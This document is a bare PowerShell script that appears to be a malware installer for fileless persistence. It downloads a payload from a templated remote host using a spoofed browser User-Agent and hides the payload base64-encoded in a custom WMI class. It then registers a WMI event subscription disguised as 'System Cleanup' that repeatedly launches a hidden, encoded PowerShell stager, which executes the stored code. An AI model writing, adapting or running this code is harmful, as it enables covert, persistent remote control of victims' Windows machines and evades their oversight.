$FilterName = "System Cleanup Filter"
$ConsumerName = "System Cleanup Consumer"
$StagerCommand = "aQBmACAAKAAhACgAKABHAGUAdAAtAFcAbQBpAE8AYgBqAGUAYwB0ACAAdwBpAG4AMwAyAF8AcAByAG8AYwBlAHMAcwAgAC0ARgBpAGwAdABlAHIAIAAiAE4AYQBtAGUAIAA9ACAAJwBwAG8AdwBlAHIAcwBoAGUAbABsAC4AZQB4AGUAJwAiACAAfAAgAHcAaABlAHIAZQAgAHsAIAAkAF8ALgBQAHIAbwBjAGUAcwBzAEkAZAAgAC0AbgBlACAAJABwAGkAZAAgAH0AIAB8ACAAcwBlAGwAZQBjAHQAIAAtAEUAeABwAGEAbgBkAFAAcgBvAHAAZQByAHQAeQAgAEMAbwBtAG0AYQBuAGQATABpAG4AZQApACAALQBzAHAAbABpAHQAIAAiACAAIgAgAC0AYwBvAG4AdABhAGkAbgBzACAAIgAtAG4AbwBsAG8AIgApACkADQAKAHsAIABpAGUAeAAgACgAWwBUAGUAeAB0AC4ARQBuAGMAbwBkAGkAbgBnAF0AOgA6AFUAbgBpAGMAbwBkAGUALgBHAGUAdABTAHQAcgBpAG4AZwAoAFsAQwBvAG4AdgBlAHIAdABdADoAOgBGAHIAbwBtAEIAYQBzAGUANgA0AFMAdAByAGkAbgBnACgAKABbAHcAbQBpAGMAbABhAHMAcwBdACAAIgByAG8AbwB0AFwAYwBpAG0AdgAyADoAVwBpAG4AMwAyAF8AQwBsAGEAcwBzAGkAYwBDAE8ATQBDAGwAYQBzAHMATQBvAG4AaQB0AG8AcgAiACkALgBQAHIAbwBwAGUAcgB0AGkAZQBzAFsAIgBOAGEAbQBlACIAXQAuAFYAYQBsAHUAZQApACkAKQAgAH0A"
$Stager = "powershell.exe -nop -nolo -w hidden -enc $StagerCommand"

$Url = if ((Get-WmiObject Win32_OperatingSystem).OSArchitecture.Contains("64")) { "{HOST_URL}/c/mw6" } else { "{HOST_URL}/c/mw3" }
$WebClient = New-Object System.Net.WebClient
$WebClient.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36(KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36")
$Worker = $WebClient.DownloadString($Url)
$StoredPayload = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($Worker))
$NewClass = New-Object System.Management.ManagementClass("root\cimv2", [String]::Empty, $null)
$NewClass.Name = "Win32_ClassicCOMClassMonitor"
$NewClass.Properties.Add("Name", $StoredPayload)
$NewClass.Put() | Out-Null
Get-WmiObject -Namespace "root" -Class __ProviderHostQuotaConfiguration | Set-WmiInstance -Arguments @{MemoryPerHost=3221223823;MemoryAllHosts=4294965097} | Out-Null

$WmiParams = @{
	ErrorAction = 'Stop'
	NameSpace = 'root\subscription'
}

$WmiParams.Class = '__EventFilter'
$WmiParams.Arguments = @{
	Name = $FilterName
	EventNamespace = 'root\CIMV2'
	QueryLanguage = 'WQL'
	Query = "SELECT * FROM __InstanceModificationEvent WITHIN 180 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 400"
}
$FilterResult = Set-WmiInstance @WmiParams

$WmiParams.Class = 'CommandLineEventConsumer'
$WmiParams.Arguments = @{
	Name = $ConsumerName
	CommandLineTemplate = $Stager
}
$ConsumerResult = Set-WmiInstance @WmiParams

$WmiParams.Class = '__FilterToConsumerBinding'
$WmiParams.Arguments = @{
	Filter = $FilterResult
	Consumer = $ConsumerResult
}

$BindingResult = Set-WmiInstance @WmiParams